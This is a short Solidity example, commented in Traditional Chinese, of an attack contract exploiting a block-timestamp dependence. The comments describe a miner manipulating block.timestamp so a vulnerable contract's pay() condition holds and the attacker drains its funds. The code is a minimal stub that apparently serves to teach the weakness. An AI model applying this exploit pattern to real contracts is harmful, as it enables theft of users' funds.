// 攻擊程式碼示例：
// 說明：由於本漏洞依賴於礦工可以控制區塊的 timestamp，因此攻擊者需要是礦工或者與礦工合作，
// 以便在生成包含 pay() 呼叫的交易的區塊時，從礦池端修改 timestamp，進而使得 time % 2 的結果為 1。
// 以下 Attack 合約展示了如何呼叫漏洞合約的 pay() 函式，請注意實際攻擊需要礦工配合操控區塊時間。

contract VulnerableTest {
    // 漏洞合約地址，部署後請傳入
    function pay() public payable {}
}

contract Attack {
    VulnerableTest public vulnerable;

    // 傳入漏洞合約地址
    constructor(address _vulnerable) public {
        vulnerable = VulnerableTest(_vulnerable);
    }

    // 攻擊函式：呼叫 vulnerable 的 pay() 函式
    // 採取行動前需和礦工協同，以便在挖礦時刻意設定區塊 timestamp 使條件為真
    function attack() public {
        vulnerable.pay();
    }
}

// 補充說明：
// 攻擊者（或操縱區塊的礦工）可以在區塊生成時調整 block.timestamp，使其符合奇數條件，
// 確保 vulnerable 合約的 pay() 函式條件成立，進而使他們能夠獲得合約中的資金。